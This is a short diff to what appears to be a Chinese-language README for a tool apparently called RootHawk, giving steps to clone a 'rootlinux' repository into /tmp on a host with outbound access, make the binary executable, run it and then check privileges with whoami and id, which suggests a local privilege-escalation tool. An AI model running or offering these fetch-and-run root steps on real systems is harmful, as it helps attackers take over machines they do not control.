@@ -2,7 +2,11 @@
 
 使用方法：
 1、cd /tmp
-2、出网主机使用命令：git clone 
-3、chmod +x 
-4、./    -any
+
+2、出网主机使用命令：git clone  https://github.com/ranq6/rootlinux.git
+
+3、chmod +x RootHawk-amd64
+
+4、./RootHawk-amd64 -any
+
 5、查看权限（whoami,id）
